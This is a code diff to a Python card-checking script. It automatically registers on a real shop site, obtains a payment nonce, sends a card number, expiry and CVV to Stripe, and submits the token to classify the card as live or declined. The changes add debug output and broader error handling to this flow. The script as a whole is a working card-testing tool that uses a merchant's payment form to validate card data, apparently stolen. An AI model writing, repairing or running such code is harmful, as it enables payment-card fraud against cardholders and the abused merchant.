@@ -33,8 +33,6 @@ def full_stripe_check(cc, mm, yy, cvv):
             'register': 'Register',
         }
         reg_response = session.post('https://orevaa.com/my-account/', data=register_data, allow_redirects=False)
-        
-        # Don't check registration too strictly - just continue
 
         # Step 4: Get payment nonce
         payment_page_res = session.get('https://orevaa.com/my-account/add-payment-method/')
@@ -43,7 +41,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
-        # Step 5: Get Stripe payment token - SIMPLIFIED
+        # Step 5: Get Stripe payment token
         stripe_data = {
             'type': 'card',
             'card[number]': cc,
@@ -55,15 +53,25 @@ def full_stripe_check(cc, mm, yy, cvv):
         
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         
-        if stripe_response.status_code == 402:
-            error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
-            return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
+        print(f"Stripe Status Code: {stripe_response.status_code}")
+        print(f"Stripe Response: {stripe_response.text}")
+        
+        if stripe_response.status_code != 200:
+            error_message = "Stripe API error"
+            try:
+                error_data = stripe_response.json()
+                error_message = error_data.get('error', {}).get('message', 'Stripe API error')
+            except:
+                pass
+            return {"status": "Declined", "response": error_message, "decline_type": "process_error"}
         
         stripe_json = stripe_response.json()
         payment_token = stripe_json.get('id')
         
+        print(f"Extracted Payment Token: {payment_token}")
+        
         if not payment_token:
-            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
+            return {"status": "Declined", "response": "Failed to retrieve Stripe token - no ID in response.", "decline_type": "process_error"}
 
         # Step 6: Submit to website
         site_data = {
